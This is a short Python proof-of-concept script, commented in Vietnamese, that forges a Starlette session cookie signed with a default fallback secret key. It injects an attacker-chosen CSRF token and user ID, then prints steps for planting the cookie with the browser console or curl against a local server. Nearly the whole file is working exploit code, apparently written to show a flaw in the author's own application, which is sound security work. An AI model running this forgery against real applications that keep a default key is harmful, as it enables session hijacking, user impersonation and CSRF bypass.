"""
PoC: Forge Starlette Session Cookie với Secret Key mặc định
Yêu cầu: pip install itsdangerous
"""

from itsdangerous import URLSafeTimedSerializer

# Secret mặc định từ fallback trong main.py
SECRET_KEY = "your-secret-key-here-change-in-production"

# Starlette SessionMiddleware dùng salt này
serializer = URLSafeTimedSerializer(SECRET_KEY, salt="cookie-session")

# Tạo session data giả
# Ví dụ: inject csrf_token để bypass CSRF validation
fake_session_data = {
    "csrf_token": "attacker_controlled_csrf_token_12345678",
    "_user_id": "1",  # Thử giả mạo user_id nếu app lưu trong session
}

# Ký và tạo cookie
signed_cookie = serializer.dumps(fake_session_data)

print("=" * 80)
print("FORGED SESSION COOKIE")
print("=" * 80)
print(signed_cookie)
print("=" * 80)
print("\nCách dùng:")
print("1. Comment SECRET_KEY trong .env và restart server")
print("2. Copy cookie trên")
print("3. Mở DevTools Console tại http://127.0.0.1:8000")
print("4. Paste lệnh sau:")
print(f'   document.cookie = "session={signed_cookie}; path=/";')
print("   location.reload();")
print("\n5. Hoặc dùng curl:")
print(
    f'   curl.exe "http://127.0.0.1:8000/home/profile" -H "Cookie: session={signed_cookie}"'
)
